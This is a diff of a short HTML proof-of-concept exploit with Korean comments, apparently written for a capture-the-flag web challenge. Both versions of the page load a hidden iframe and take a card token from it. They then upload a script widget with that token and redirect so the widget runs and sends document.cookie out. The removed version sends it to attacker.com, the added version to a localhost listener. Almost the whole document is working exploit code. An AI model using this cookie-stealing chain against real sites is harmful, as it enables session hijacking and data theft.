@@ -1,36 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <script>
-    async function main() {
-        // 1. iframe을 생성하여 /preview 로드
-        const iframe = document.createElement('iframe');
-        iframe.src = 'http://localhost:5000/preview';
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        await new Promise(resolve => { iframe.onload = resolve; });
-        // 2. 토큰 읽기
-        const token = iframe.contentWindow.CARD_TOKEN;
-        if (!token) throw new Error('no token');
-        // 3. 위젯 코드 (flag 탈취)
-        const widgetCode = `
-            fetch('https://attacker.com/steal?flag=' + encodeURIComponent(document.cookie));
-        `;
-        // 4. 위젯 업로드
-        const res = await fetch('http://localhost:5000/export', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/javascript',
-                'X-Card-Token': token
-            },
-            body: widgetCode
-        });
-        const widgetName = await res.text();
-        // 5. 리다이렉트하여 위젯 실행
-        location.href = 'http://localhost:5000/review?widget=' + widgetName;
-    }
-    main().catch(console.error);
-    </script>
+    <title>poc</title>
 </head>
-<body></body>
+<body>
+<script>
+(async () => {
+    // iframe 로드
+    const iframe = document.createElement('iframe');
+    iframe.src = 'http://localhost:5000/preview';
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+    await new Promise(resolve => { iframe.onload = resolve; });
+    // 토큰 획득
+    const token = iframe.contentWindow.CARD_TOKEN;
+    if (!token) {
+        console.error('no token');
+        return;
+    }
+    // 위젯 코드: flag 탈취
+    const widgetCode = `fetch('http://localhost:8000/steal?c=' + encodeURIComponent(document.cookie));`;
+    // 업로드
+    const res = await fetch('http://localhost:5000/export', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/javascript',
+            'X-Card-Token': token
+        },
+        body: widgetCode
+    });
+    const widgetName = await res.text();
+    // 리다이렉트
+    location.href = 'http://localhost:5000/review?widget=' + widgetName;
+})();
+</script>
+</body>
 </html>
